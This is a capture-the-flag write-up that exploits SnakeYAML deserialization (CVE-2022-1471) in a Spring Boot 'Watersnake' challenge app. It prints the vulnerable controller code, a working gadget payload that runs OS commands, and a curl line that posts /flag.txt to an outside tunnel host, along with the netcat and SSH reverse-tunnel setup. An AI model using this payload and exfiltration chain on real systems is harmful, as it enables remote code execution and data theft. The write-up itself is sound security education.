# Watersnake - CTF Writeup

**Category:** Web Application, Java Deserialization

**Author:** Atlas

**Date:** 2026-07-01

**Tools Used:** curl, netcat, ssh (serveo.net tunnel), browser DevTools

> As the United Nations of Zenium and the Board of Arodor engage in a fierce competition to establish a colony on Mars using Vitalium, state hackers from UNZ identify an exposed instance of the critical facility water management software, Watersnake v3, in one of Arodor's main water treatment plants. The objective is to gain control over the water supply and weaken Arodor's infrastructure.

## Source Code Analysis

### Overview

The challenge provides source code for a Spring Boot web application. Three routes are exposed:

| Route | Method | Description |
|---|---|---|
| `/` | GET | Redirects to `/index.html` |
| `/stats` | GET | Runs `./watersensor --stats` and returns stdout |
| `/update` | POST | Accepts a `config` parameter, parses it as YAML |

The critical vulnerability lives in `Controller.java`:

```java
@PostMapping("/update")
public String update(@RequestParam(name = "config") String updateConfig) {
    InputStream is = new ByteArrayInputStream(updateConfig.getBytes());
    Yaml yaml = new Yaml();
    Map<String, Object> obj = yaml.load(is);
    obj.forEach((key, value) -> System.out.println(key + ":" + value));
    return "Config queued for firmware update";
}
```

`yaml.load()` is called without a type-safe constructor, making it vulnerable to **CVE-2022-1471** (SnakeYAML deserialization). The `pom.xml` confirms SnakeYAML version `1.33` is in use — affected by the CVE.

The `/stats` endpoint runs `./watersensor --stats` via `GetWaterLevel.readFromSensor()`, which uses `ProcessBuilder` to execute the command and return its stdout to the caller.

The `flag.txt` is placed at `/flag.txt` per the Dockerfile:
```
COPY flag.txt /flag.txt
```

### The Gadget

`GetWaterLevel`'s constructor calls `initiateSensor(value)` → `readFromSensor(value)` → `ProcessBuilder(value.split("\\s+"))`. This means constructing a `GetWaterLevel` object via YAML deserialization with an attacker-controlled string will execute an arbitrary OS command.

The payload format:
```yaml
!!com.lean.watersnake.GetWaterLevel ["<command here>"]
```

SnakeYAML will instantiate `GetWaterLevel` with our string as the constructor argument, triggering command execution.

### The Blind Execution Problem

The output of the command is **not returned** to the HTTP response — SnakeYAML throws an exception after instantiation (because `yaml.load()` expects a `Map` but gets a `GetWaterLevel` object), so stdout from the command never reaches the caller. This means we need a **blind exfiltration** technique — executing a command that sends the flag to us out-of-band.

---

## Exploitation

### Overview

Since the server has no outbound internet access to a standard attacker machine, we used **serveo.net** — a free SSH reverse tunnel service — to expose a local netcat listener to a public HTTPS URL that the target server could reach.

### Commands Used

**Input:** Open a reverse tunnel via serveo.net to expose local port 8000 publicly.

```bash
ssh -R 80:localhost:8000 serveo.net
```

**Output:**
```
Forwarding HTTP traffic from https://51986a07ee20bdb0-68-134-210-41.serveousercontent.com
```

**Input:** Start a netcat listener on port 8000 to receive the raw HTTP POST body (the flag).

```bash
nc -lvnp 8000
```

**Input:** Send the YAML deserialization payload to the `/update` endpoint, using `curl` to POST the flag file contents to our listener.

```
Payload: !!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST https://51986a07ee20bdb0-68-134-210-41.serveousercontent.com"]
```

Sent via the Firmware Update page textarea, or equivalently:

```bash
curl -X POST http://154.57.164.69:30255/update \
  --data-urlencode 'config:!!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST https://51986a07ee20bdb0-68-134-210-41.serveousercontent.com"]'
```

**Output (netcat terminal):**
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48990
POST / HTTP/1.1
Host: 51986a07ee20bdb0-68-134-210-41.serveousercontent.com
User-Agent: curl/7.74.0
Content-Length: 33
Accept: */*
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 149.6.129.245
HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
```

The flag arrived in the POST body as the contents of `/flag.txt`, curled from the target server to our listener via the serveo tunnel.

### Solution

**Answer:** `HTB{sn4k3_y4ml_d3s3r14lized_ftw!}`

**Summary:** The `/update` endpoint used `yaml.load()` on unsanitized user input with SnakeYAML 1.33 (CVE-2022-1471). Because `GetWaterLevel`'s constructor executes an OS command via `ProcessBuilder`, a YAML payload that instantiates `GetWaterLevel` with a `curl` command caused the server to POST `/flag.txt` to an attacker-controlled listener. Since the target had no direct internet access, a serveo.net SSH reverse tunnel was used to expose a local netcat listener at a public HTTPS URL reachable by the target. Netcat (instead of Python's HTTP server) was used as the receiver because Python's `http.server` returns 501 on POST requests.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Python YAML gadgets (`!!python/object/apply`) | Java backend — Python gadgets don't apply | Always match gadget language to backend runtime |
| Reading flag via `/stats` after modifying `watersensor` | Command output not returned by YAML deserialization; SnakeYAML throws exception before response | Need out-of-band exfiltration when output is blind |
| `python3 -m http.server` as POST listener | Returns HTTP 501 on POST requests | Use netcat for raw listener; Python's http.server is GET-only |
| Hosting exploit infrastructure externally | No VPN tunnel in this challenge — direct attacker IP unreachable | Use serveo.net (SSH reverse tunnel) to proxy through localhost |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Flag | `HTB{sn4k3_y4ml_d3s3r14lized_ftw!}` | SnakeYAML CVE-2022-1471 deserialization → blind RCE → `curl` flag to netcat via serveo.net tunnel |

---

## References

- [CVE-2022-1471 - SnakeYAML Deserialization](https://nvd.nist.gov/vuln/detail/CVE-2022-1471)
- [SnakeYAML Constructor Gadget Chains](https://github.com/artsploit/yaml-payload)
- [serveo.net - SSH Reverse Tunnel Service](https://serveo.net)
- OWASP: Deserialization of Untrusted Data (A08:2021)
